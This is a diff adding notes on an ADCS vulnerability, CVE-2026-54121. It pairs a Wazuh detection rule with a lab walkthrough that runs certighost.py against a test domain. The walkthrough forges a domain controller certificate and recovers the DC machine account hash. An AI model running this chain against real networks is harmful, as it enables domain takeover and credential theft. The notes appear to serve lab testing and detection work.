@@ -1,5 +1,84 @@
 # ADCS
 
+## CVE
+
+### CVE-2026-54121 (Certighost)
+
+#### Detect
+
+Assumes DC account list `/var/ossec/etc/lists/dc-accounts`:
+
+```txt
+CONTOSO\\WIN-DC01$:
+SALES\\WIN-DC02$:
+EXT\\WIN-DC03$:
+SALES\\WIN-DC04$:
+```
+
+```xml
+<group name="adcs,">
+
+  <rule id="100700" level="0">
+    <if_sid>60103</if_sid>
+    <field name="win.system.eventID">^4887$</field>
+    <list field="win.eventdata.subject" lookup="match_key">etc/lists/dc-subjects</list>
+    <description>certificate issued for DC</description>
+  </rule>
+
+  <rule id="100701" level="14">
+    <if_sid>100700</if_sid>
+    <list field="win.eventdata.requester" lookup="not_match_key">etc/lists/dc-accounts</list>
+    <description>CVE-2026-54121: non-DC requester $(win.eventdata.requester) obtained certificate for $(win.eventdata.subject)</description>
+    <mitre>
+      <id>T1649</id>
+    </mitre>
+  </rule>
+
+</group>
+```
+
+#### Execution
+
+Scenario:
+
+```txt
+DOMAIN: sales.contoso.lab
+
+WIN-DC02
+> LVL: 2016
+> ADDR: 192.168.1.12
+
+WIN-SRV01
+> LVL: 2016
+> ADDR: 192.168.1.21
+> SVC: ADCS
+```
+
+```bash
+sudo python3 certighost.py -d sales.contoso.lab \
+-u bob -p 'b0bB411D4' \
+--dc-ip 192.168.1.12 \
+--ca-ip 192.168.1.21 \
+--listener 192.168.1.145 \
+--ca sales-WIN-SRV01-CA-1
+# [*] Connecting to LDAPS
+# [*] Detecting infrastructure
+#     DC: 192.168.1.12 | CA: sales-WIN-SRV01-CA-1 (192.168.1.21)
+#     Target: WIN-DC02$ | SID: S-1-5-21-1548103905-787397850-1049434999-1000
+# [*] Creating computer: GHOSTXANWJYAN$
+# [*] Starting rogue servers (LSA:445 + LDAP:389)
+# [*] Requesting certificate (template=Machine, cdc=192.168.1.145)
+#     Saved: win-dc02.pfx
+# [*] PKINIT as WIN-DC02$
+# [*] Got hash for WIN-DC02$:
+#     WIN-DC02$:aad3b435b51404eeaad3b435b51404ee:88111600ccddb865d9d2f3cbdff3a17c
+#     ccache: win-dc02.ccache
+# [*] GGWP
+
+ls
+# certighost.py  README.md  win-dc02.ccache  win-dc02.pfx
+```
+
 ## ESC1
 
 ### Execute
